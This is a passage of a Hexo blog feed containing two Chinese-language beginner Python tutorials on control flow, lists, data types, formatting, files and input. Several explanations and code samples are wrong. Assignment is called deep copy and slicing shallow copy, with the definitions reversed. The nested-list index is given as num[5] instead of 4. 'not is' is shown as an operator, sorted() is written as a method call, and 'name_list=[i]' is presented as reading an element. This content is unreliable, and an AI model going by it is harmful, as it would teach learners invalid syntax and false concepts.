    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="程序流程控制if"><a href="#程序流程控制if" class="headerlink" title="程序流程控制if"></a>程序流程控制if</h2><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p>Python语言所使用的关系运算符表：</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211445336.png" alt="image-20200925211445336"></p><p>运算如果是真会传回True，如果是伪会传回False。</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>Python所使用的逻辑运算符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and ---相当于逻辑符号AND</span><br><span class="line"></span><br><span class="line">or ---相当于逻辑符号OR</span><br><span class="line"></span><br><span class="line">not ---相当于逻辑符号NOT</span><br></pre></td></tr></table></figure><p>逻辑运算符and的图例说明:</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211707974.png" alt="image-20200925211707974"></p><p>逻辑运算符or的图例说明:</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211743164.png" alt="image-20200925211743164"></p><p>逻辑运算符not的图例说明:</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925211824495.png" alt="image-20200925211824495"></p><h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><p>if语句的基本语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(条件判断)：</span><br><span class="line"> 程序代码</span><br></pre></td></tr></table></figure><p>流程图：</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925212035174.png" alt="image-20200925212035174"></p><p>在Python内是使用内缩方式区隔if语句的程序代码区块，编辑程序时可以用Tab键内缩或是直接内缩4个字符空间，表示这是if语句的程序代码区块。</p><h4 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if else语句"></a>if else语句</h4><p>条件判断为True时执行某一个程序代码区块，当条件判断为False时执行另一段程序代码区块，此时可以使用if … else语句，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(条件为真)：</span><br><span class="line">程序代码区块1</span><br><span class="line">else：</span><br><span class="line">程序代码区块2</span><br></pre></td></tr></table></figure><p>流程图：</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925214652836.png" alt="image-20200925214652836"></p><h4 id="if-elif-else语句"><a href="#if-elif-else语句" class="headerlink" title="if  elif  else语句"></a>if  elif  else语句</h4><p>这是一个多重判断，基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(条件判断1)：</span><br><span class="line">程序代码区块1</span><br><span class="line">elif(条件判断2):</span><br><span class="line">程序代码区块2</span><br><span class="line">else：</span><br><span class="line">程序代码块n</span><br></pre></td></tr></table></figure><p>流程图：</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925215242142.png" alt="image-20200925215242142"></p><h4 id="嵌套的if语句"><a href="#嵌套的if语句" class="headerlink" title="嵌套的if语句"></a>嵌套的if语句</h4><p>嵌套的if语句是指在if语句内有其他的if语句，如：</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925215606572.png" alt="image-20200925215606572"></p><h2 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h2><p>列表(list)是Python的一种可以更改内容的数据类型，它是由一系列元素所组成的序列。</p><p>定义列表的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name_list&#x3D;[元素1，元素2.....，元素n]</span><br></pre></td></tr></table></figure><p>列表的每一个数据称元素，这些元素放在中括号[ ]内，彼此用逗号“,”隔开。如果要打印列表内容，可以使用print( )函数，将列表名称当作变量名称即可。</p><h4 id="读取列表元素"><a href="#读取列表元素" class="headerlink" title="读取列表元素"></a>读取列表元素</h4><p>可以用列表名称与索引读取列表元素的内容，在Python中元素是从索引值0开始配置。所以如果是列表的第一个元素，索引值是0，第二个元素索引值是1，其他依此类推，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name_list&#x3D;[i]  #读取索引i的列表元素</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jame&#x3D;[12,13,14,15,16]</span><br><span class="line">game1,game2,game3,game4,game5&#x3D;jame</span><br><span class="line">print(&quot;jame得分&quot;,game1,game2,game3,game4,game5)</span><br></pre></td></tr></table></figure><h4 id="列表切片"><a href="#列表切片" class="headerlink" title="列表切片"></a>列表切片</h4><p>常会需要取得列表前几个元素、后几个元素、某区间元素或是依照一定规则排序的元素，所取得的系列元素也可称子列表，这个观念称列表切片。可以用下列方法：</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20200925222934240.png" alt="image-20200925222934240"></p><p>在列表使用中，如果索引值是-1，代表是最后一个列表元素。</p><p>在Python中索引-1代表最后1个元素，-2代表最后第2个元素，其他负索引观念可依次类推。</p><h4 id="列表统计最大、最小、总和"><a href="#列表统计最大、最小、总和" class="headerlink" title="列表统计最大、最小、总和"></a>列表统计最大、最小、总和</h4><p>如果列表内容全部是数值则可以使用max( )函数获得列表的最大值，min( )函数可以获得列表的最小值，sum( )函数可以获得列表的总和。如果列表内容全部是字符或字符串则可以使用max( )函数获得列表的unicode码值的最大值，min( )函数可以获得列表的unicode码值最小值。sum( )则不可使用在列表元素为非数值情况。</p><h4 id="列表个数len"><a href="#列表个数len" class="headerlink" title="列表个数len"></a>列表个数len</h4><p>len( )函数可以获得列表的元素个数。</p><h4 id="列表相加"><a href="#列表相加" class="headerlink" title="列表相加"></a>列表相加</h4><p>Python是允许列表相加的，相当于将列表结合。</p><p>如果将列表以一个数字，这个数字相当于是列表元素重复次数。</p><h4 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h4><p>删除指定索引的列表元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del name_list[i]  #删除索引i的列表元素</span><br></pre></td></tr></table></figure><p>删除列表区间元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del name_list[start:end] #删除从索引start到end-1索引的列表元素</span><br></pre></td></tr></table></figure><p>用step作为每隔多少区间再删除:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del name_list[start:end:step]  #每隔step步，删除所有start到end-1</span><br></pre></td></tr></table></figure><p>建立一个空列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name_list&#x3D;[]</span><br></pre></td></tr></table></figure><h4 id="删除列表"><a href="#删除列表" class="headerlink" title="删除列表"></a>删除列表</h4><p>Python允许我们删除整个列表，列表一经删除后就无法复原，同时也无法做任何操作了，删除列表的方式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del name_list #删除列表name_list</span><br></pre></td></tr></table></figure><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><p>在面向对象的程序设计(Object Oriented Programming)观念里，所有数据皆算是一个对象(Object)，例如，整数、浮点数、字符串或是本章所提的列表皆是一个对象。可以为所建立的对象设计一些方法(method)，供这些对象使用，在这里所提的方法就是函数。</p><p>Python有为一些基本对象提供默认的方法，要使用这些方法可以在对象后先放小数点，再放方法名称，基本语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象.方法()</span><br></pre></td></tr></table></figure><p>字符串操作常用的方法(method)如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lower( )：将字符串转成小写</span><br><span class="line"></span><br><span class="line">upper( )：将字符串转成大写</span><br><span class="line"></span><br><span class="line">title( )：将字符串转成第一个字母大写，其他是小写</span><br><span class="line"></span><br><span class="line">rstrip( )：删除字符串尾端多余的空白</span><br><span class="line"></span><br><span class="line">lstrip( )：删除字符串开始端多余的空白</span><br><span class="line"></span><br><span class="line">strip( )：删除字符串头尾两边多余的空白</span><br></pre></td></tr></table></figure><h4 id="增加与删除列表元素"><a href="#增加与删除列表元素" class="headerlink" title="增加与删除列表元素"></a>增加与删除列表元素</h4><p>在列表末端增加元素append( )：</p><p>Python为列表内置了新增元素的方法append( )，这个方法，可以在列表末端直接增加元素。方法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist.append(&#39;新增元素&#39;)</span><br></pre></td></tr></table></figure><p>插入列表元素insert( )：</p><p>append( )方法是固定在列表末端插入元素，insert( )方法则是可以在任意位置插入元素，它的使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert(索引，元素内容) #索引是插入位置，元素内容是插入内容</span><br></pre></td></tr></table></figure><p>删除列表元素pop():</p><p>pop( )方法删除元素最大的优点是，删除后将弹出所删除的值，使用pop( )时若是未指明所删除元素的位置，一律删除列表末端的元素。pop( )的使用方式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value&#x3D;namelist.pop()  #没有索引是删除列表末端的元素</span><br><span class="line">value&#x3D;namelist.pop(i)  #删除指定索引值的列表元素</span><br></pre></td></tr></table></figure><p>删除指定元素remove():</p><p>在删除列表元素时，有时可能不知道元素在列表内的位置，此时可以使用remove()方法删除指定的元素，它的使用方式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist.remove(想删除的元素内容)</span><br></pre></td></tr></table></figure><h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><p>颠倒排序reverse( )：</p><p>reverse( )可以颠倒排序列表元素，它的使用方式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist.reverse()  #颠倒namlist中的列表元素</span><br></pre></td></tr></table></figure><p>列表经颠倒排放后，就算永久性更改了，如果要复原，可以再执行一次reverse( )方法。</p><p>sort( )排序：</p><p>sort( )方法可以对列表元素由小到大排序，这个方法同时对纯数值元素与纯英文字符串元素有非常好的效果。需要注意的是，经排序后原列表的元素顺序会被永久更改。它的使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist.sort()</span><br></pre></td></tr></table></figure><p>sorted( )排序:</p><p>如果不希望更改列表元素顺序，可以使用另一种排序sorted( )，使用这个排序可以获得想要的排序结果，我们可以用新列表存储新的排序列表，同时原先列表的顺序将不更改。它的使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newlist.sorted(namelist)</span><br></pre></td></tr></table></figure><h4 id="列表操作index"><a href="#列表操作index" class="headerlink" title="列表操作index"></a>列表操作index</h4><p>index可以返回特定元素内容第一次出现的索引值，它的使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">索引值&#x3D;列表名称.index(搜寻值)</span><br></pre></td></tr></table></figure><h4 id="列表操作count"><a href="#列表操作count" class="headerlink" title="列表操作count"></a>列表操作count</h4><p>可以返回特定元素内容出现的次数，它的使用格式为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">次数&#x3D;列表名称.count(搜寻值)</span><br></pre></td></tr></table></figure><h4 id="列表操作join"><a href="#列表操作join" class="headerlink" title="列表操作join"></a>列表操作join</h4><p>这个方法可以将列表的元素组成一个字符串，它的使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char.join(seq)</span><br></pre></td></tr></table></figure><p>seq表示参数必须为列表、元组等序列数据，char则是组合后各元素间的分隔字符，可以是单一字符，也可以是字符串。</p><h4 id="列表内含列表"><a href="#列表内含列表" class="headerlink" title="列表内含列表"></a>列表内含列表</h4><p>列表内含列表的基本格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num&#x3D;[1,2,3,4,[7,8,9]]</span><br></pre></td></tr></table></figure><p>num是一个列表，在这个列表内有另一个列表[7, 8, 9]，因为内部列表的索引值是5，所以可以用num[5]，获得这个元素列表的内容.</p><p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20201002150307424.png" alt="image-20201002150307424"></p><p>想要存取列表内的列表元素，可以使用下列格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[索引1][索引2]</span><br></pre></td></tr></table></figure><p>索引1是元素列表原先索引位置，索引2是元素列表内部的索引。</p><h4 id="列表的深复制"><a href="#列表的深复制" class="headerlink" title="列表的深复制"></a>列表的深复制</h4><p>只要有一个列表更改元素会影响到另一个列表同步更改的复制称深复制(deep copy)。</p><p>假设我喜欢的运动是，篮球与棒球，可以用下列方式设定列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysports&#x3D;[&#39;football&#39;，‘baseetball’]</span><br></pre></td></tr></table></figure><p>如果我的朋友也喜欢这2种运动，可以下列方式设定列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">friedsports&#x3D;mysports</span><br></pre></td></tr></table></figure><h4 id="列表的浅复制-shallow-copy"><a href="#列表的浅复制-shallow-copy" class="headerlink" title="列表的浅复制-shallow copy"></a>列表的浅复制-shallow copy</h4><p>浅复制(shallow copy)观念是，执行复制后当一个列表改变后，不会影响另一个列表的内容。方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frinedsports&#x3D;mysports[:]</span><br></pre></td></tr></table></figure><h4 id="split-处理字符串"><a href="#split-处理字符串" class="headerlink" title="split( )处理字符串"></a>split( )处理字符串</h4><p>这个方法(method)，可以将字符串以空格为分隔符，将字符串拆开，变成一个列表。变成列表后我们可以使用len( )获得此列表的元素个数，这相当于可以计算字符串是由多少个英文字母组成，由于中文字之间没有空格，该方法只适用在纯英文文件。</p><h4 id="in和not-in"><a href="#in和not-in" class="headerlink" title="in和not in"></a>in和not in</h4><p>主要是用于判断一个对象是否属于另一个对象，对象可以是字符串(string)、列表(list)、元组(Tuple)。语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boolan&#x3D;obj1 in obj2 # obj1在obj2内会传回True</span><br><span class="line">boolan&#x3D;obj1 not in obj2 # obj1不在obj2内会传回True</span><br></pre></td></tr></table></figure><h4 id="is和not-is"><a href="#is和not-is" class="headerlink" title="is和not is"></a>is和not is</h4><p>用于比较两个对象是否相同，在此所谓相同并不只是内容相同，而是指对象变量指向相同的内存，对象可以是变量、字符串、列表、元组(Tuple)。语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boolan&#x3D;obj1 is obj2 # obj1等于obj2会传回True</span><br><span class="line">boolan&#x3D;obj1 not is obj2 # obj1不等于obj2会传回True</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-基础2</title>
    <link href="http://yoursite.com/2020/09/22/Python-%E5%9F%BA%E7%A1%802/"/>
    <id>http://yoursite.com/2020/09/22/Python-基础2/</id>
    <published>2020-09-22T05:54:58.000Z</published>
    <updated>2020-09-24T14:41:24.325Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>Python的基本数据类型有下列几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数值数据类型：常见的数值数据又可分成整数(int)和浮点数(float）</span><br><span class="line"></span><br><span class="line">布尔值(Boolean)数据类型</span><br><span class="line"></span><br><span class="line">字符串(string)数据类型</span><br></pre></td></tr></table></figure><h4 id="查看数据类型type"><a href="#查看数据类型type" class="headerlink" title="查看数据类型type"></a>查看数据类型type</h4><p>type( )函数可以列出变量的数据类型类别。</p><h4 id="整数与浮点数的运算"><a href="#整数与浮点数的运算" class="headerlink" title="整数与浮点数的运算"></a>整数与浮点数的运算</h4><p>Python具有简单自动转换能力，在计算时会将整数转换为浮点数再执行运算。</p><p>如不同数据类型的运算：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924213432821.png" alt="image-20200924213432821"></p><p>执行结果为：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924213517737.png" alt="image-20200924213517737"></p><h4 id="进位与函数"><a href="#进位与函数" class="headerlink" title="进位与函数"></a>进位与函数</h4><p>Python中定义凡是0b开头的数字，代表这是2进位的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin()函数可以将一般数字转换为2进位</span><br></pre></td></tr></table></figure><p>Python中定义凡是0o开头的数字，代表这是8进位的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oct()函数可以将一般数字转换为8进位</span><br></pre></td></tr></table></figure><p>Python中定义凡是0x开头的数字，代表这是16进位的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex()函数可以将一般数字转换为16进位</span><br></pre></td></tr></table></figure><h4 id="强制数据类型转换"><a href="#强制数据类型转换" class="headerlink" title="强制数据类型转换"></a>强制数据类型转换</h4><p>int( )：将数据类型强制转换为整数。</p><p>float( )：将数据类型强制转换为浮点数。</p><p>如将浮点数强制转换为整数的运算：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214228593.png" alt="image-20200924214228593"></p><p>运算结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214254420.png" alt="image-20200924214254420"></p><h4 id="数值运算常用函数"><a href="#数值运算常用函数" class="headerlink" title="数值运算常用函数"></a>数值运算常用函数</h4><p>abs()：计算绝对值。</p><p>pow(x,y)：返回x的y次方。</p><p>round()：返回四舍六入，不是四舍五入。</p><h4 id="布尔值类型"><a href="#布尔值类型" class="headerlink" title="布尔值类型"></a>布尔值类型</h4><p>Python的布尔值(Boolean)数据类型的值有两种，True(真)或False(伪)，它的数据类型代号是bool。这个布尔值一般是应用在程序流程的控制，特别是在条件表达式中。</p><p>如果将布尔值数据类型强制转换成整数，当原值是True，将得到1；当原值是False，将得到0。</p><p>如将布尔值强制转换为整数，同时列出转换的结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214812881.png" alt="image-20200924214812881"></p><p>执行结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214839869.png" alt="image-20200924214839869"></p><h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><p>字符串(string)数据是指两个单引号(‘)之间或是两个双引号(“)之间任意个数字元符号的数据，它的数据类型代号是str。</p><p>数学的运算符“+”，可以执行两个字符串相加，产生新的字符串。</p><p>str( )函数可以强制将数值数据转换为字符串数据。</p><p>使用单引号与双引号设定与输出字符串数据：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215013609.png" alt="image-20200924215013609"></p><p>执行结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215041213.png" alt="image-20200924215041213"></p><p>在处理多于一行的字符串时，可以使用三个单引号（或是三个双引号）将字符串包夹。</p><h5 id="关于逸出字符"><a href="#关于逸出字符" class="headerlink" title="关于逸出字符"></a>关于逸出字符</h5><p>在字符串使用中，如果字符串内有一些特殊字符，如单引号、双引号等，必须在此特殊字符前加上“\”(反斜杠)，才可正常使用，这种含有“\”符号的字符称逸出字符(Escape Character)。如下表：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215517313.png" alt="image-20200924215517313"></p><p>字符串使用中特别是碰到字符串含有单引号时，如果是使用单引号定义这个字符串时，必须要使用此逸出字符，才可以顺利显示。</p><h5 id="字符串数据的转换"><a href="#字符串数据的转换" class="headerlink" title="字符串数据的转换"></a>字符串数据的转换</h5><p>如果字符串含一个字符或一个文字时，可以使用下列执行数据的转换：</p><p>chr( x )：可以返回函数x值的字符，x是ASCII码值。</p><p>ord( x )：可以返回函数字符参数的Unicode码值，如果是中文字也可传回Unicode码值。如果是英文字符，Unicode码值与ASCII码值是一样的。</p><p>在Python可以允许将字符串与整数相乘，结果是字符串将重复该整数的次数。如下：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215902501.png" alt="image-20200924215902501"></p><p>执行结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215932287.png" alt="image-20200924215932287"></p><p>有时设计程序时，想将字符串分行输出，可以使用字符串加法功能，在加法过程中加上换行字符“\n”即可产生字符串分行输出的结果。</p><h5 id="字符串前加r"><a href="#字符串前加r" class="headerlink" title="字符串前加r"></a>字符串前加r</h5><p>在使用Python时，如果在字符串前加上r，可以防止逸出字符(Escape Character)被转译。</p><h2 id="基本输入与输出"><a href="#基本输入与输出" class="headerlink" title="基本输入与输出"></a>基本输入与输出</h2><p>help( )函数可以列出某一个Python的指令或函数的使用说明。</p><h4 id="格式化输出print"><a href="#格式化输出print" class="headerlink" title="格式化输出print"></a>格式化输出print</h4><p>在使用格式化输出时，基本使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print（“输出格式区” % （变量系列区））</span><br></pre></td></tr></table></figure><p>可以放置变量系列区对应的格式化字符，基本意义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%d：格式化整数输出</span><br><span class="line"></span><br><span class="line">%s：格式化字符串输出</span><br><span class="line"></span><br><span class="line">%f：格式化浮点数输出</span><br><span class="line"></span><br><span class="line">%x：格式化16进制输出</span><br><span class="line"></span><br><span class="line">%o：格式化8进制输出</span><br></pre></td></tr></table></figure><h4 id="精准格式化输出"><a href="#精准格式化输出" class="headerlink" title="精准格式化输出"></a>精准格式化输出</h4><p>print( )函数在格式化过程中，有提供功能可以设定保留多少格的空间让资料做输出，语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%(+|-)nd：格式化整数输出</span><br><span class="line"></span><br><span class="line">%(+|-)m.nf：格式化浮点数输出</span><br><span class="line"></span><br><span class="line">%(+|-)nx：格式化16进位整数输出</span><br><span class="line"></span><br><span class="line">%(+|-)no：格式化8进位整数输出</span><br><span class="line"></span><br><span class="line">%(-)ns：格式化字符串输出</span><br></pre></td></tr></table></figure><p>对浮点数而言，m代表保留多少格数供输出（包含小数点），n则是小数数据保留格数。至于其他的数据格式n则是保留多少格数空间，如果保留格数空间不足将完整输出数据，如果保留格数空间太多则数据靠右对齐。</p><p>如果格式化数值数据有加上负号(-)，表示保留格数空间有多时，数据将靠左输出。如果格式化数值数据有加上正号(+)，表示输出数据是正值时，将在左边加上正值符号。</p><h4 id="format函数"><a href="#format函数" class="headerlink" title="format函数"></a>format函数</h4><p>字符串使用format方法做格式化的动作，基本使用格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;输出格式区&quot; .format(&quot;变量系列区&quot;))</span><br></pre></td></tr></table></figure><p>在输出格式区内的字符串变量使用“{ }”表示。</p><h4 id="输出数据到文件"><a href="#输出数据到文件" class="headerlink" title="输出数据到文件"></a>输出数据到文件</h4><h5 id="打开一个文件open"><a href="#打开一个文件open" class="headerlink" title="打开一个文件open"></a>打开一个文件open</h5><p>open( )函数可以打开一个文件供读取或写入，如果这个函数执行成功，会传回文件对象，这个函数的基本使用格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_open&#x3D;open(file,mode&#x3D;&quot;r&quot;)</span><br></pre></td></tr></table></figure><p>mode代表写入模式，基本的模式有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">“r”：这是预设，打开文件供读取(read)。</span><br><span class="line"></span><br><span class="line">“w”：打开文件供写入，如果原先文件有内容将被覆盖。</span><br><span class="line"></span><br><span class="line">“a”：打开文件供写入，如果原先文件有内容，新写入数据将附加在后面。</span><br><span class="line"></span><br><span class="line">“x”：打开一个新的文件供写入，如果所打开的文件已经存在会产生错误。</span><br><span class="line"></span><br><span class="line">“b”：以二进制模式打开文件。</span><br><span class="line"></span><br><span class="line">“t”：打开本文(txt)文件模式，这是默认。</span><br><span class="line"></span><br><span class="line">“+”：打开文件供更新用。</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f1&#x3D;open(&quot;d:\1.txt&quot;,mode&#x3D;&quot;w&quot;)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><h4 id="数据输入input"><a href="#数据输入input" class="headerlink" title="数据输入input"></a>数据输入input</h4><p>input( )函数功能与print( )函数功能相反，这个函数会从屏幕读取用户从键盘输入的数据，它的使用格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value&#x3D;input(&quot;promt:&quot;)</span><br></pre></td></tr></table></figure><p>value是变量，所输入的数据会存储在此变量内，特别需注意的是所输入的数据不论是字符串或是数值数据返回到value时一律是字符串数据，如果要执行数学运算需要用int( )函数转换为整数。</p><p>基本数据输入与运算示例：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924223817769.png" alt="image-20200924223817769"></p><h4 id="列出所有内置函数dir"><a href="#列出所有内置函数dir" class="headerlink" title="列出所有内置函数dir"></a>列出所有内置函数dir</h4><p>可以使用下列方式列出Python所提供的内置函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(_ _builtins_ _) 列出python内置函数</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924224110041.png" alt="image-20200924224110041"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-基础1</title>
    <link href="http://yoursite.com/2020/09/18/Python-%E5%9F%BA%E7%A1%801/"/>
    <id>http://yoursite.com/2020/09/18/Python-基础1/</id>
    <published>2020-09-18T05:16:44.000Z</published>
